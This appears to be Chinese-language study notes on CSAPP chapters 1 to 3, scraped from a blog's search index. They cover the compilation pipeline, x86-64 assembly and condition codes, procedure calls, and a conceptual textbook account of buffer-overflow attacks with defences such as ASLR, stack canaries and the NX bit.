最后，链接器将两个目标代码文件与实现库函数的代码合并，并产生最终的可执行代码文件 有两种重要的抽象： 由指令集体系结构或指令集架构来定义机器及程序的格式和行为，它定义了处理器状态、指令的格式，以及每条指令对状态的影响； 机器级程序使用的内存地址是虚拟地址，提供的内存模型看上去是一个非常的大的字节数组。存储器系统的实际实现时将多个硬件存储器和操作系统软件组合起来。 对C程序员隐藏的处理器状态细节包括： 程序计数器（PC，用%rip%表示）给出将要执行的下一条指令地址； 整数寄存器包含16个命名的而为之，分别存储64位的值； 条件码寄存器保存着最近执行的算数或逻辑指令的状态信息，用来实现控制或数据流中的条件变化； 一组向量寄存器可以存放一个或多个整数或浮点数值； 程序内存包含：程序的可执行机器源码，操作系统需要的一些信息，用来管理过程调用和返回的运行时栈，以及用户分配的内存块（比如调用malloc分配的）； 编译相关命令： text -s 编译成.s汇编文件 -c 编译+汇编成.o目标文件 -o 编译+汇编+链接，直接生成可执行文件 其中gdb的使用命令如下： text (gdb)x/14xb multstore # 其中x为打印，x表示16进制，b表示字节，multstore是函数地址 要查看机器代码文件，使用反汇编器： bash objdump -d mstore.o 其中机器指令的一些特性包括： 指令长度1到15不等，常用的指令以及操作数较少的指令所需的字节数少，不太常用或者操作数较多的指令所需字节数较多； 设计指令格式的方式是，从某个特定位置开始，可以将字节唯一的解码成机器指令； 指令中后缀的q是一种传送数据大小的表示； 部分nop指令的插入是为了使哈桑农户代码变为16字节，使得就存储器性能而言，能更好的放置下一个代码块； 要在C程序中使用汇编代码，有两种方法： 直接用汇编语言编写源码，在链接阶段将他们与C语言程序链接起来； 在C语言程序中使用内联汇编； 两种汇编代码格式（根据编译时的-masm=intel或者-masm=at\u0026t）进行判断：intel格式省略了后缀，省略了寄存器名字前面的%，用不同的方式来描内存中的位置；和AT\u0026T格式列出操作数的顺序相反，源在前，目的地址在后。 ","date":"2024-02-29","objectID":"/ch3/:2:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#程序编码"},{"categories":["系统入门"],"content":" 13 数据格式因为Intel是从16位扩展到32位的，有如下几个术语： 8位：字节，后缀为b 16位：字，后缀为w 32位：双字，后缀为l 64位：四字，后缀为q 浮点数：32位，4个字节，后缀为s 双精度浮点数：64位，8个字节，后缀为l ","date":"2024-02-29","objectID":"/ch3/:3:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#数据格式"},{"categories":["系统入门"],"content":" 14 访问信息和常用指令对于生成8字节结果的指令，对于剩下的字节的处理，有两种方式： 生成1字节和2字节数字的指令会保持剩下的字节不变； 生成4字节数字的指令会把高位4个字节置为0。 操作数形式： 源操作数：常数（立即数，用$开头）、寄存器（r开头，R[r]表示它的值）或内存（M[Addr]） 其中寻址使用Imm（rb,ri,s)表示，Imm是里立即数偏移，rb是基址寄存器，ri是变址寄存器，s是比例因子，s必须是1、2、4或8，地址的计算公式为Imm+R[rb]+R[ri]*s 目的操作数：寄存器、内存 其中，寄存器部分的大小必须与指令最后一个字符指定的大小匹配。 关于数据转移指令和pushq，popq指令： movq指令只能以表示为32位补码数字的立即数作为源操作数，然后符号扩展到64位； movabsq指令能够以任意64位立即数值作为源操作数，并且只能以寄存器为目的； movz表示在从小位移动到大位的过程中，采用0扩展； movs表示在从小位移动到大位的过程中，采用符号扩展； etlq只能作用于寄存器%eax和%rax，相当于monvslq %eax, %rax %rsp保存栈顶的地址，pushq S是先减顶再压值，popq是先弹值再加顶 关于算数逻辑指令： leaq rS,D等效于D\u003c-\u0026S，目的是加载有效地址，它不读取内存数据，不触及内存；但是可以为后面的内存引用产生指针，目的操作数必须是一个寄存器；还可以用于计算（利用Imm（rb,ri,s)寻址公式）； SAL和SHL均为左移，左移是在右边补上0 SAR和SHR均为右移，但是前者是算数右移，后者是逻辑右移，前者是在前面补1，后者是在前面补上0 一元和二元操作 一元操作的目的和源是同一个。操作数可以是寄存器或内存位置； 二元操作的第二个操作数既是源，也是目的，可以是寄存器或内存位置；第一个操作数还可以是常数； 移位操作：移位操作先给出移位量，第二项是要移位的数，可以进行算术和逻辑右移；移位量可以是一个立即数，或者放在单字节寄存器%cl中，移位量以%cl的低m位决定，高位会被忽略），目的操作数可以是寄存器或内存位置。 关于一些特殊的算术操作： imulq S是有符号全乘法，idivq S是有符号除法； mulq是无符号全乘法，divq是无符号除法； cqto转换位八字； 其中两个乘法的操作数都是64位，都要求一个参数在%rax中，另一个作为指令的源操作数给出；乘积为127位，高64位放在%rdx中，低64位在%rax中； 两个除法都以128位的一个数为操作数（存储方式和上述乘积结果的存储方式相同），另一个直接给出，商存储在%rax中，余数存储在%rdx中； cqto隐含的将64位的%rax进有符号扩展，扩展在%rdx中，然后再进行除法； ","date":"2024-02-29","objectID":"/ch3/:4:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#访问信息和常用指令"},{"categories":["系统入门"],"content":" 15 控制除了整数寄存器，CPU还维护一组单个位的条件码寄存器，可以检测这些寄存器来执行条件分支指令，最常用的条件码有： CF：进位标志，用来检测无符号操作的溢出； ZF：零标志，判断最近操作的结果是否为0； SF：符号标志，最近的操作得到的结果为负数； OF：溢出标志，用来检测有符号操作的溢出（正溢出或负溢出） 假设用ADD指令完成等价于C表达式t=a+b的功能，然后根据下面的表达式来设置条件码： text CF (unsigned)t \u003c (unsigned)a ZF (t == 0) SF (t\u003c0) OF (a\u003c0 == b\u003c0) \u0026\u0026 (t\u003c0 != a\u003c0) leaq指令不改变任何条件码，因为它是用来进行地址计算的，除此以外其他指令都会设置条件码。 还有两种指令会改变条件码，但是不设置任何的寄存器： CMP指令：通过两个操作数之差来设置条件码 TEST指令行为与AND指令相同。典型的用法是两个操作数是一样的，或者一个操作数是一个掩码，用来指示哪些位应该被测试； 访问条件码： 使用set指令根据条件码来对某些值进行设置：如setl表示小于时候设置（注意这里l不是操作数大小） 一条set指令的目的操作数是低位单字节寄存器元素之一，或者是一个字节的内存位置，指令会将这个字节设置为0或1 有符号比较 当没有发生溢出时（OF为0） 当a-b\u003c0时a\u003cb，那么有SF=1 而当a-b\u003e=0，即a\u003e=b时，SF=0 a=b时，ZF=1 当发生溢出时（OF=1） 当a-b\u003c0时，有a\u003eb（SF=1） 反之亦然 a=b时，ZF=1 综上，溢出和符号位的亦或，以及和ZF的组合提供了a和b的测试 无符号比较' a\u003cb时，a-b\u003c0，CF=1 a=b时，ZF=1 综上，进位符号和零标志的组合决定了a和b的测试 注意：机器代不会将每个程序值和数据类型联系起来，大多数情况下机器代码对有符号和无符号都执行一样的指令，这是因为许多算术运算对无符号和补码算术运算的位级行为相同。有些情况需要用不同的指令来处理有符号和无符号的操作，例如使用不同版本的右移、除法和乘法指令，以及不同的条件码组合。 关于跳转指令： 在产生目标代码文件时，汇编器会确定所有的带标号指令的地址，并将跳转目标（目的指令的地址）编码为跳转指令的一部分； 有直接跳转和间接跳转两种 直接跳转：跳转目标作为指令的一部分编码，是给出一个标号作为跳转目标，例如.L1 间接跳转：写法是* 后面跟一个操作数指示符，比如jmp *%rax 除了jmp，其他的跳转指令都是有条件的，这些指令的名字与跳转条件与SET指令的名字匹配 条件跳转只能是直接跳转 跳转目标一般用符号标号书写，有几种不同的编码，最常用的是PC相对的，会将目标指令地址和紧跟在跳转指令后面那条指令的i地址的差值作为编码，地址偏移量可以编码为1、2、4个字节； 第二种编码方法是给出绝对地址，用4个字节直接指定目标； 当执行PC相对寻址时，程序计数器的值是跳转指令后面那条指令的地址，而不是跳转指令本身的地址。PC相对寻址的好处在于，指令编码比较简洁（因为是差值），并且目标代码可以不做任何改变就移到内存中不同的位置； rep和reptz的用法在于：实现重复的字符串操作。在AMD给编译器编写者的指导意见书中可以看到，他们建议用rep后面跟ret的组合来避免使ret指令成为条件跳转指令的目标。如果没有rep指令，当ret指令通过跳转指令到达时，处理器不能正常预测ret指令的目的。这里的rep指令实际上就是一种空操作，以此作为跳转目的插入它，除了能使代码在AMD上运行的更快以外，不会改变代码的其他行为。 关于用条件传送来实现条件分支： 因为通过控制的条件转移可能比较低效，一种替代的策略是使用数据的条件转移。这种方法计算一个条件操作的两种结果，然后再根据条件选择是否满足从中选取一个，只需要一条条件转移指令实现。 其计算过程是，首先在寄存器中存储一个分支的结果。利用条件转移指令测试另一个分支的情况，如果该分支满足，则把另一个分支的值赋给寄存器。 该方法能够提高效率的原因是：流水线通过重叠连续指令的步骤来获得高性能，例如在取同一条指令的同时，执行它前面一条指令的算术运算。要做到这一点，要求能够实现确定要执行的指令序列，这样才能保持流水线中充满了待执行的指令。当机器遇到分支时，只有当分支求值条件完成后，才能决定分支往哪边走。一旦分支预测错误，就会浪费很多时钟周期，导致程序性能严重下降。如果使用条件转移指令，我们可以保证流水线是满的。 条件转移指令与SET指令结合，只有当条件满足时，才从源地址运送值到目的地址。不支持单字节的条件传送。 同条件跳转不同，处理器无需预测测试的结果就可以执行条件传送，处理器只是读原值，检查条件码，要么更新目的寄存器，要么保持不变。 注意，因为两种情况都求值，因此可能存在某个操作有副作用但是被执行了的情况，比如解引了空指针。 do-while循环部分较为简单，这里不解释了。 关于while循环，有两种翻译方法： 第一种是jump to middle（跳转到中间）： text goto test; loop: body-statement test: t=test-expr if(t) goto loop; 第二种是guarded-do： text t=test-expr; if(!t) goto done do body-statement while(test-expr); done 或者 text t = test-expr if(!t) goto done; loop: body statement t=test-expr if(t) goto loop; done for循环部分较为简单，这里不解释了。 关于switch-case语句（具体案例需要看书P159-162，这里不方便解释）： Important 这一部分非常重要，但是又略微复杂，需要好好复习掌握。 主要使用跳转表的结构，跳转表是一个数组，其中表项i是一个代码段的地址，这个代码段相当于实现当开关索引等于i时程序应该采取的动作。 程序代码用开关索引之来执行一个跳转表内的数组引用，确定跳转指令的目标； 使用跳转表的优点是，执行开关语句的时间与开关情况的数量无关。 gcc根据开关情况的数量和开关情况值的稀疏程度来翻译开关语句。 当开关数量比较多，且值的跨度范围比较小时，就会使用跳转表 可能出现的情况： 情况标号跨过一个不连续的区域（比如部分情况没有标号）； 有些情况有多个标号； 有些情况会落入其他情况之中； ","date":"2024-02-29","objectID":"/ch3/:5:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#控制"},{"categories":["系统入门"],"content":" 16 过程 Tip 这一节非常重要，从书本P164-176，后面的实验很大程度需要利用到这一节的知识。 关于过程： 过程是一种概述，过程的形式多种多样：包括函数、方法、子例程、处理函数等，但是它们有一些共有的特性； 假设P过程调用Q，Q返回到P，过程包括 传递控制 用callq和retq：callq可以是直接的，也可以是间接的，格式同jmp相同； 传递数据 6个以内的参数可以通过寄存器传递，分别为%rdi %rsi %rdx %rcx %r8 %r9 6个以内的数可以通过寄存器传递，超过6个要用栈来传递。设有n个参数要传递且$n\u003e7$，那么我们需要将其保存在栈上。其中第7个参数是保存在栈顶的。通过栈传递参数时，所有的数据大小都向8的倍数对齐。 分配和释放内存 栈上的局部存储 大部分的情况下，都可以在寄存器中实现参数传递，但是部分情况下，数据仍然需要存储在内存中，这些情况包括 寄存器不足够存放所有的本地数据 对一个局部变量使用地址运算符\u0026，因此必须为它产生一个地址 某些局部变量是数组或结构，因此必须能够通过数组或结构访问到 寄存器的使用和分配遵循一定的惯例，因为我们需要保证当一个过程（调用者）调用另一个过程（被调用者）时，被调用者不会覆盖调用者稍后会使用的寄存器。为此，x86-64采用了一组统一的寄存器使用惯例。 根据惯例，%rbx, %rbp, %r12-%r15被划分为被调用者保存寄存器。被调用者保存意思是被调用的过程需要保证在程序返回时，这几个寄存器的值和调用它的时候是一样的。（相当于借了别人的东西，无论是不是使用了，都需要保证这几个东西在归还的时候和借用的时候是一样的）这样调用者就不会担心自己借给别人的寄存器中的值被破坏。通常的做法是，要么被调用的过程压根就不用这些值，要么就把这些值都压在栈上。 所有其他寄存器，除了%rsp，都是调用者保存寄存器。任何函数都能修改他们，因此该函数有责任保存好这些寄存器的值。 ","date":"2024-02-29","objectID":"/ch3/:6:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#过程"},{"categories":["系统入门"],"content":" 17 数组分配和访问 Tip 重点关注书上例题，数组的地址计算方法，尤其是汇编下用leaq的计算过程。 这部分主要是地址的计算，leaq的使用，还有一些汇编中的地址计算方法。具体的细节需要通过看书上的例子，暂不总结。 ","date":"2024-02-29","objectID":"/ch3/:7:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#数组分配和访问"},{"categories":["系统入门"],"content":" 18 异质的数据结构本节主要的内容为： 结构体的存储讲解 union和结构体的差别，以及union的适用范围 如某个字段的数据类型不确定，如某个二叉树结点的值，既可能是两个指针，也可能是两个double类型值，那么就用union并在一起，通过加入一个枚举类型，来判断这个节点的类型； 还可以使用union来获取一个double值的unsigned类型对应值（不同的数据位表示相同，但是数值不同） 注意union中有数组的时候，数组的值在大端序和小端序机器上排列方式不同； 数据的对齐 对齐的好处：简化了形成处理器和内存系统之间接口的硬件设计。 对齐原则是：任何K字节的基本对象的地址都必须是K的倍数。 实现方式是：编译器在汇编代码中放入命令，指明全局数据所需的对齐，如.align 8 ","date":"2024-02-29","objectID":"/ch3/:8:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#异质的数据结构"},{"categories":["系统入门"],"content":" 19 在机器级程序中将控制与数据结合起来","date":"2024-02-29","objectID":"/ch3/:9:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#在机器级程序中将控制与数据结合起来"},{"categories":["系统入门"],"content":" 19.1 函数指针函数指针提供了一个很强大的存储和像代码提供引用的功能，这些引用可以被程序某个其他部分调用，比如我们定义一个函数： c int fun(int x, int *p); // 定义函数 fun int (*fp)(int, int*); // 声明一个指针fp，该条语句的意思是，这个指针指向的函数，必须接受int和in*类型的参数，然后返回一个int类型 fp = fun; // 让函数指针指向这个函数 接下来我们可以使用这个指针来调用这个函数： c int y = 1; int result = fp(3,\u0026y); 其中，函数指针的值是该函数机器代码表示中的第一条指令的地址。 ","date":"2024-02-29","objectID":"/ch3/:9:1","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#函数指针"},{"categories":["系统入门"],"content":" 19.2 内存越界和缓冲区溢出一个典型的问题在于使用gets函数，gets函数没有办法确定是否为保存整个字符串分配了足够的空间，因此如果用户输入的字符串长度超过了之前分配的大小，就会溢出到不合法的存储区域中。一个经典的案例是如果用户输入的字符串过长，字符串可能会覆盖掉该函数的返回地址，因此在执行ret语句时，可能就会跳转到不合法的区域中去。尤其是在使用缓冲区溢出攻击时，我们如果在获取到了函数的汇编代码，我们可以刚好让自己跳转的字符串覆盖掉返回地址，让该函数返回到我们想要它返回的地方。我们可以在程序中插入恶意代码，让该函数返回到恶意代码处，执行恶意代码。这就是一种缓冲区溢出攻击。或者通过缓冲区溢出，让自己的攻击代码覆盖原有的代码，以此诱惑系统执行。 相比gets函数，一个更好的版本是使用fgets函数，该函数包括一个参数，限制读入的最大字节数。类似gets的可能产生缓冲区溢出漏洞的函数还有strcpy、strcat、sprintf等等，这些都要谨慎使用。 一个缓冲区溢出的经典案例是蠕虫。注意蠕虫和病毒的差别在于，蠕虫可以自己运行，并且将自己的等效副本传播到其他机器，而病毒能将自己添加到包括操作系统在内的其他程序中，但它不能独立运行。 ","date":"2024-02-29","objectID":"/ch3/:9:2","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#内存越界和缓冲区溢出"},{"categories":["系统入门"],"content":" 19.3 对抗缓冲区溢出攻击现代操作系统对抗缓冲区溢出的方法有几种： 栈随机化 为了向系统中插入攻击代码，攻击者既要插入代码，也要插入指向这段代码的指针。要知道这个指针，我们就必须知道这个字符串放置的栈地址。过去程序的栈非常容易预测，因此许多系统都可以遭受到同一种病毒的攻击，这被称为安全单一化。 栈随机化的思想使得栈的位置在每次运行时都有变化，实现的方式是程序开始时，在栈上分配一段0-n字节之间的随即大小的空间，程序不使用这段空间，但是它使得程序每次执行后续栈的位置发生了变化。分配的n必须足够大，来让足够多的栈地址变化，但是又要足够小，不至于浪费太多空间。 在Linux系统中，栈随机化已经变成了标准行为。这类技术被称为地址空间布局随机化（ASLR）。使用这种技术，每次运行时程序的不同部分，都会加载到内存的不同区域中。 当然，部分攻击者使用蛮力克服随机化，可以反复的用不同的地址进行攻击。一种常见的把戏是在实际的攻击代码前插入很长一段的nop指令。只要攻击者能够猜中这段序列中的某个地址，程序就会经过这个序列，到达攻击代码。这个序列常用的术语是空雪橇操作（nop sled）。 因此栈随机化不能完全的提供安全保障。 栈破坏检测 栈破坏检测的核心思想是在发生了越界写的时候，在造成任何有害结果之前，尝试检测到它。 最近的gcc版本在产生的代码中加入了一种栈保护者机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区与栈状态之间存储一个特殊的金丝雀值，也成为哨兵值。这个值是随机产生的，因此攻击者无法预测这个值是什么。那么在恢复寄存器状态和从函数返回之前，程序检查这个值是否发生了改变（通过存储金丝雀值到栈上，然后利用xorq异或指令，在程序运行结束后判断栈位置处的值，和已经保存到栈上的金丝雀值是否相同）。如果是，那么程序异常终止。 限制可执行代码区域 在典型的程序中，只有保存编译器代码的那部分才是需要可执行的，其他部分被限定为只允许读和写。 虚拟内存在逻辑上被分成了页，典型的每页是2048字节或4096个字节。硬件支持多种类型的内存保护，许多系统允许控制3种访问形式：读、写和执行（将内存中的内容看作机器级代码） 以前，x86体系结构将读和执行访问控制合并成1位，这样任何可读的都是可执行的。 栈必须是可读可执行，栈上的字节可读可执行。很多机制限制了很多页是可读但是不可知性，但是这带来了严重的性能损失。 AMD为它的64位处理器的内存保护引入了NX位（不执行位），将读和执行模式分开，Intel也跟进了。有了这个特性，栈可以标记为可读和可写，但是不可执行。而检查页是否可执行由硬件来完成，效率上没有损失。 有些类型的程序要求动态产生和执行代码的能力，例如即时编译技术为解释语言编写的程序动态的查收你哼代码，以提高执行性能。是否能够将可执行代码限制在由编译器在创建原始程序时产生的那个部分中，取决于语言和操作系统。 ","date":"2024-02-29","objectID":"/ch3/:9:3","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#对抗缓冲区溢出攻击"},{"categories":["系统入门"],"content":" 19.4 支持变长栈帧 前面的程序的特点在于，编译器能够预先确定需要为栈帧分配多少空间。但是有些函数，需要的局部存储是变长的。例如使用alloca标准库函数，可以在栈上分配任意字节数量的存储。当代码声明一个局部变长数组时，就会发生这种状况。 为了管理变长栈帧，x86-64代码使用寄存器%rbp作为栈指针（有时称为基指针）。代码必须把%rbp之前的值压到栈上，因为他是一个被调用者保存寄存器。然后在函数的执行过程中，都使得%rbp指向那个时刻栈的位置，然后用固定长度的局部变量相对于%rbp的偏移量来引用它们。 在调用这个过程是，首先需要压%rbp，将%rbp设置为当前的%rsp。然后分配空间，进行一系列操作（这时%rsp会发生变化）。而在调用结束后，会先令%rsp = %rbp，然后通过popq操作把过去的%rbp还原。 现代编译器支持带%rbp和不带%rbp混用，只要按照惯例将%rbp作为被调用者保存寄存器来处理即可。 ","date":"2024-02-29","objectID":"/ch3/:9:4","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#支持变长栈帧"},{"categories":["系统入门"],"content":" 20 浮点代码 Tip 待建设。 这一节的内容感觉不是很常用，先放一放吧。 ","date":"2024-02-29","objectID":"/ch3/:10:0","series":["15-213"],"tags":["x86汇编","逆向工程"],"title":"CSAPP Ch3：程序的机器级表示","uri":"/ch3/#浮点代码"},{"categories":["系统入门"],"content":" 1 信息的表示和处理信息 = 二进制位的组合 + 对位组合的解释：无符号，补码，有符号整数，浮点数。 介绍了一点 C 语言的演变历史：汇编不方便 —\u003e ANSI C -\u003e ISC C90 -\u003e ISO C99 -\u003e ISO C11(可以在编译时通过-std=cxx指定编译所使用的版本) 1 个字节 = 8 位 -\u003e 内存中信息的编码以字节为单位 -\u003e 机器级程序将内存看作一个大的数组（虚拟内存）-\u003e 利用指针来存储地址 -\u003e 指针是机器级代码的概念，其组成包含类型+值，但是类型在内存当中是不可见的，在内存中所有东西都是没有感情的字节数组。-\u003e 指针的大小 = 字长（总线一次传输数据的最大字节数）-\u003e 虚拟地址空间以字编码 -\u003e 字长：虚拟地址空间的最大大小 -\u003e 32 位机器：4GB 64 位机器：16EB -\u003e 32位程序 \u0026 64位程序指的是：如何编译 字节的表示方法包括：16 进制，10 进制，2 进制等等。 字节序：对跨越多个字节的程序对象，我们必须明确： 地址在哪里：存储的最低字节处 如何排列他们：大端法 or 小端法？ ASCII 编码与 Unicode 编码。Unicode 和 UTF-8 是什么关系？ 布尔代数与位运算，其有分配律，且(a^b)^a = b，位向量掩码，经典的inplace_swap利用异或进行值交换 逻辑运算，short circuits 移位运算： 逻辑右移 算术右移（有符号数算术右移，无符号数逻辑右移，Java 使用\u003e\u003e\u003e来进行逻辑右移） 注意： 移动 k 位（k 很大时），移动 k % w 位 加法和减法的优先级 \u003e 移位运算优先级，如 1\u003c\u003c2+3\u003c\u003c4，因此移位时记得加括号 ","date":"2024-02-29","objectID":"/ch2/:1:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 2 - 信息的表示和处理 阅读笔记","uri":"/ch2/#信息的表示和处理"},{"categories":["系统入门"],"content":" 2 整数的表示和运算 通过引用#include \u003cstdint.h\u003e，然后使用INTX_t，就可以使用特定位数的某种类型。可以使用宏%\" PRId32 \"来打印串。 在\u003climits.h\u003e中限定了INT_MAX,INT_MIN，UINT_MAX等等 INT_MIN = -(-INT_MAX - 1) ","date":"2024-02-29","objectID":"/ch2/:2:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 2 - 信息的表示和处理 阅读笔记","uri":"/ch2/#整数的表示和运算"},{"categories":["系统入门"],"content":" 3 浮点数的表示浮点数针对范围大，精度低的表示。整数针对范围小，精度高的表示。 单精度浮点数(float)：1 位符号位 + 8 位阶码 + 23 位位数 双精度浮点数(double)：1 位符号位 + 11 位阶码 + 52 位尾数 其表示包含四种情况： 阶码部分是使用了移码计算，其计算方法如下： $$ bias = 2^{k-1} - 1 $$ $$ exp = E - bias $$ 规格化数：阶码部分不全为 0 也不全为 1 其尾数计算方法如下： $$ M = 1 + f $$ 非规格化数：阶码部分全为 0 其尾数部分为$f$，阶码部分计算如下： $$ exp = 1 - bias $$ 这种阶码的计算方式实现了非规格化数到规格化数的平滑过渡。 无穷大：阶码部分全为 1，尾数部分全为 0 NaN：阶码部分全为 1，尾数部分不为 0 ","date":"2024-02-29","objectID":"/ch2/:3:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 2 - 信息的表示和处理 阅读笔记","uri":"/ch2/#浮点数的表示"},{"categories":["系统入门"],"content":" 4 重点习题 2 进制，16 进制，10 进制之间的转化 大端法和小端法对同一个数值的不同存储方式 整数和浮点数表示的重合部分 布尔代数和位运算 位向量掩码 布尔运算之间的组合（or,and,xor,not） 逻辑运算 使用位级运算和逻辑运算实现^ 移位运算的计算 同样位表示的无符号和补码值 相同位表示下，无符号数和补码值的转换 无符号数和有符号数的比较（默认转化为无符号数后比较） 有符号数/无符号数的符号扩展 不同类型+大小之间的值的转换 数值的截断 隐式转换可能带来的程序问题，以及如何避免 无符号数的加法和溢出判定 无符号数求反 有符号的加法和溢出判定 有符号数求反 无符号的乘法 补码乘法 无符号的乘法 乘以 2 的幂 乘以常数 \u0026 2 种移位运算 无符号数除法 有符号数除法（向上舍入） 小数的二进制表示和十进制表示 浮点数的表示（规格化，非规格化，INF，NaN 的情况） 浮点数的计算 浮点数的范围 整数和浮点数之间的转换，以及其共有部分 浮点数的舍入 不同类型之间转换带来的精度损失（溢出或舍入） ","date":"2024-02-29","objectID":"/ch2/:4:0","series":["15-213"],"tags":null,"title":"CSAPP Chapter 2 - 信息的表示和处理 阅读笔记","uri":"/ch2/#重点习题"},{"categories":["系统入门"],"content":"CSAPP的全称是Computer Systems: A Programmer's Perspective，中文翻译为《深入理解计算机系统》。这本书以hello world程序的运行贯穿始终，可以作为应用级别程序员一窥底层概貌的显微镜，也可以作为系统方向研究者的研究的方向概览。下面我们从第一章出发，进入计算机系统的世界。 ","date":"2024-02-29","objectID":"/ch1/:0:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#"},{"categories":["系统入门"],"content":" 1 信息 = 位 + 上下文 计算机系统 = 硬件 + 系统软件 hello 从源程序开始 -\u003e 所有信息都用位表示 -\u003e 8 个位一组 -\u003e 字节 —\u003e ASCII 标准编码字节 —\u003e 文本字符 -\u003e 文本文件 其他 -\u003e 二进制文件 数据都是比特位，区别在于上下文如何解释他们 C 语言的起源：作为用于 Unix 操作系统的语言被开发 ","date":"2024-02-29","objectID":"/ch1/:1:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#信息--位--上下文"},{"categories":["系统入门"],"content":" 2 程序与编译系统编译过程： 预处理器(cpp)修改原始 hello.c程序，生成hello.i文件 编译器(ccl)将其翻译为机器语言指令，生成hello.s文件 汇编器(as)将其翻译为二进制目标文件(可重定位目标程序)，生成hello.o文件 链接器(ld)将其与其他预编译好的二进制目标文件链接起来，生成二进制可执行文件，生成hello文件 什么是可重定位目标程序？ GNU 项目 \u0026 自由软件概念 \u0026 开源运动（环境为 GNU 环境，内核为 Linux 内核） 了解编译器工作过程的好处： 优化程序性能 理解链接时出现的错误 避免安全漏洞 ","date":"2024-02-29","objectID":"/ch1/:2:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#程序与编译系统"},{"categories":["系统入门"],"content":" 3 处理器 \u0026 内存中机器指令此时hello已经被编译成可执行文件并存储在磁盘上。 ","date":"2024-02-29","objectID":"/ch1/:3:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#处理器--内存中机器指令"},{"categories":["系统入门"],"content":" 3.1 硬件组成 总线：传输定长字节块，称为字（各系统不一样大） I/O 设备：键盘、鼠标、显示器、磁盘驱动器等。每个 I/O 设备通过一个控制器或适配器与 I/O 总线相连。其区别主要在于其封装方式。 主存：临时存储设备，在处理器执行程序时，用来存放程序和程序处理的数据，由一组动态随机存储器（DRAM）芯片构成。从逻辑上来说，存储器是一个线性的字节数组，每个字节都有唯一的地址（数组索引）。 处理器：是解释或执行存储在主存中引擎的指令。下一条要执行的指令的地址存储在 PC 中。CPU 中还包含一组寄存器。CPU 的设计根据指令集架构而不同。微体系结构描述的就是这个处理器是如何实现的。 ","date":"2024-02-29","objectID":"/ch1/:3:1","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#硬件组成"},{"categories":["系统入门"],"content":" 3.2 hello 程序运行假设我们在shell中输入以下内容： bash ./hello 其运行的过程如下： shell 程序将输入字符串./hello逐一读入寄存器（通过 I/O 桥和总线接口） 将其转储到内存中（通过总线接口和 I/O 桥） shell 程序从磁盘中加载可执行的hello可执行文件，将其从磁盘通过 I/O 桥复制到主存（DMA 技术，如果没有 DMA 技术，还需要通过处理器才能到达主存） 处理器执行hello程序中的指令 hello world字符串：主存 —\u003e I/O 桥 -\u003e 总线接口 —\u003e 寄存器文件 -\u003e 总线接口 -\u003e I/O 桥 -\u003e 图形适配器 —\u003e 显示器 ","date":"2024-02-29","objectID":"/ch1/:3:2","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#hello-程序运行"},{"categories":["系统入门"],"content":" 4 高速缓存 \u0026 存储设备层次结构高速缓存：较大的存储设备运行慢，造价低。而近年来处理器和主存之间的速度差距还在增大。因此，高速缓冲存储器(cache)的目的是尽量减少处理器和主存之间差异带来的速度差距。其采用更小更快的存储设备，作为暂时的存储区域。其使用静态随机访问存储器（SRAM）技术实现。 核心：高速缓存的局部性原理 存储设备层次结构：在处理器和较大较慢的设备之间插入一个更小更快的存储设备，上一层次设备作为第一层存储器的高速缓存。 ","date":"2024-02-29","objectID":"/ch1/:4:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#高速缓存--存储设备层次结构"},{"categories":["系统入门"],"content":" 5 操作系统资源管理 \u0026 抽象操作系统：应用程序和硬件之间插入的一层软件。 其几个基本功能包括： 防止硬件被失控的应用程序滥用 向应用程序提供简单一致的机制来控制复杂而又通常大不相同的低级硬件设备（利用抽象） 文件: I/O 设备抽象 虚拟内存：主存 + 磁盘 I/O 设备抽象 进程：对处理器、主存和 I/O 设备抽象 Unix、POSIX 和标准 Unix 规范： 时期 1：OS/360 + Multics 时期 2：Unix（包含层次文件系统、作为用户级进程的 shell 概念） 时期 3：Unix 4.xBSD(增加了虚拟内存和 Internet 协议) + System V Unix + Solaris 时期 4：IEEE 标准化 Unix 开发，将该标准命名为 POSIX 标准 ","date":"2024-02-29","objectID":"/ch1/:5:0","series":["15-213"],"tags":null,"title":"CSAPP Ch1：计算机系统漫游","uri":"/ch1/#操作系统资源管理--抽象"},{"categories":["系统入门"],"content":" 5.1 进程 \u0026 线程 5.1.1 